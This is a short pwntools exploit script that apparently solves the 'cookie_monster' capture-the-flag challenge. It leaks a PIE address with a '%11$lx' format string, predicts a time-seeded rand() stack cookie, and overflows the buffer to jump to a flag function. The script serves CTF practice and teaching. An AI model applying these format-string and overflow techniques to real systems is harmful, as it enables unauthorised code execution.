from ctypes import *
from pwn import *

target=remote('ctf.umbccd.io', 4200)
#target=process('./cookie_monster')
#elf=ELF('./cookie_monster')
#libc=elf.libc

libc=CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time(None))
randv=int(libc.rand())
print(randv)
print(hex(randv))
context.terminal=["tmux","split","-h"]
#gdb.attach(target)

print(target.recvuntil("name?\n"))
fs="%11$lx"
target.sendline(fs)

print(target.recvuntil("Hello, "))
leak=int(target.recvline().strip("\n"),16)
pie_base=leak-0x134f
flag_func=pie_base+0x11b5

payload="A"*13
payload+=p64(randv)
payload+="A"*4
payload+=p64(flag_func)

print(target.recvuntil("cookie?\n"))
target.sendline(payload)
#print(target.recv())

target.interactive()
